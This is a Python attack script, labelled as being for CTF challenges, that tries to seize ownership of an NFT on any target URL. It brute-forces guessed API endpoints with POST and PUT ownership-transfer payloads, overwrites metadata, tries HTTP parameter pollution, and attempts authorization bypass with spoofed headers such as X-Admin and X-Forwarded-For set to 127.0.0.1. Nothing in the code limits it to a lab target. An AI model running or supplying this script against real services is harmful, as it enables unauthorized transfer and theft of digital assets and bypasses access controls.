#!/usr/bin/env python3
"""
Simple NFT Takeover Script for CTF Challenges
==============================================
For educational CTF challenges only!
"""

import requests
import json
import sys

def nft_takeover(target_url, nft_id=1):
    """
    Attempt common NFT takeover techniques
    """
    print(f"[*] Starting NFT Takeover on: {target_url}")
    print(f"[*] Target NFT ID: {nft_id}")

    session = requests.Session()

    # 1. Try direct ownership change via API
    print("\n[1] Testing Direct Ownership Change...")
    payloads = [
        {"tokenId": nft_id, "newOwner": "attacker"},
        {"id": nft_id, "owner": "attacker"},
        {"nftId": nft_id, "to": "attacker"},
        {"nft": {"id": nft_id, "owner": "attacker"}},
    ]

    endpoints = [
        f"/api/nft/{nft_id}/transfer",
        f"/api/nft/transfer",
        f"/nft/transfer",
        f"/api/tokens/{nft_id}",
        f"/api/nft/{nft_id}/owner",
    ]

    for endpoint in endpoints:
        for payload in payloads:
            try:
                # Try POST
                response = session.post(
                    f"{target_url}{endpoint}",
                    json=payload,
                    headers={"Content-Type": "application/json"}
                )

                if response.status_code in [200, 201, 204]:
                    print(f"[+] SUCCESS via POST to {endpoint}")
                    print(f"    Payload: {payload}")
                    print(f"    Response: {response.text[:200]}")
                    return True

                # Try PUT
                response = session.put(
                    f"{target_url}{endpoint}",
                    json=payload,
                    headers={"Content-Type": "application/json"}
                )

                if response.status_code in [200, 201, 204]:
                    print(f"[+] SUCCESS via PUT to {endpoint}")
                    print(f"    Payload: {payload}")
                    print(f"    Response: {response.text[:200]}")
                    return True

            except Exception as e:
                pass

    # 2. Try metadata manipulation
    print("\n[2] Testing Metadata Manipulation...")
    metadata_endpoints = [
        f"/api/nft/{nft_id}/metadata",
        f"/metadata/{nft_id}",
        f"/api/metadata/{nft_id}",
        f"/nft/{nft_id}",
    ]

    malicious_metadata = {
        "name": "HACKED NFT",
        "owner": "attacker",
        "description": "This NFT has been taken over",
        "attributes": [{"trait_type": "Owner", "value": "attacker"}]
    }

    for endpoint in metadata_endpoints:
        try:
            response = session.post(
                f"{target_url}{endpoint}",
                json=malicious_metadata
            )

            if response.status_code in [200, 201, 204]:
                print(f"[+] Metadata manipulation successful at {endpoint}")
                return True

        except:
            pass

    # 3. Try parameter pollution
    print("\n[3] Testing Parameter Pollution...")
    pollution_urls = [
        f"{target_url}/api/nft/transfer?from=victim&to=attacker&to=attacker&tokenId={nft_id}",
        f"{target_url}/api/nft/{nft_id}?owner=attacker&action=transfer",
        f"{target_url}/transfer?nft={nft_id}&owner[]=victim&owner[]=attacker",
    ]

    for url in pollution_urls:
        try:
            response = session.post(url)
            if response.status_code in [200, 201, 204]:
                print(f"[+] Parameter pollution successful!")
                print(f"    URL: {url}")
                return True
        except:
            pass

    # 4. Try authorization bypass
    print("\n[4] Testing Authorization Bypass...")
    auth_bypass_headers = [
        {"X-Admin": "true"},
        {"X-User-Id": "1"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
    ]

    for headers in auth_bypass_headers:
        try:
            response = session.post(
                f"{target_url}/api/nft/{nft_id}/transfer",
                json={"to": "attacker"},
                headers=headers
            )

            if response.status_code in [200, 201, 204]:
                print(f"[+] Auth bypass successful with headers: {headers}")
                return True
        except:
            pass

    print("\n[-] All takeover attempts failed")
    return False


def check_nft_owner(target_url, nft_id):
    """Check current NFT owner"""
    endpoints = [
        f"/api/nft/{nft_id}",
        f"/api/tokens/{nft_id}",
        f"/nft/{nft_id}",
        f"/api/nft/{nft_id}/owner",
    ]

    session = requests.Session()

    for endpoint in endpoints:
        try:
            response = session.get(f"{target_url}{endpoint}")
            if response.status_code == 200:
                data = response.json()
                print(f"[*] NFT Info from {endpoint}:")
                print(json.dumps(data, indent=2))
                return data
        except:
            pass

    return None


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python nft-takeover.py <target_url> [nft_id]")
        print("Example: python nft-takeover.py http://ctf.example.com 1")
        sys.exit(1)

    target = sys.argv[1]
    nft_id = int(sys.argv[2]) if len(sys.argv) > 2 else 1

    # Remove trailing slash
    if target.endswith('/'):
        target = target[:-1]

    print("="*50)
    print("NFT TAKEOVER SCRIPT - CTF EDUCATIONAL USE ONLY")
    print("="*50)

    # Check current owner
    print("\n[*] Checking current NFT owner...")
    check_nft_owner(target, nft_id)

    # Attempt takeover
    print("\n[*] Attempting NFT takeover...")
    if nft_takeover(target, nft_id):
        print("\n[+] NFT TAKEOVER SUCCESSFUL!")

        # Verify takeover
        print("\n[*] Verifying takeover...")
        check_nft_owner(target, nft_id)
    else:
        print("\n[-] NFT takeover failed - target may be secure")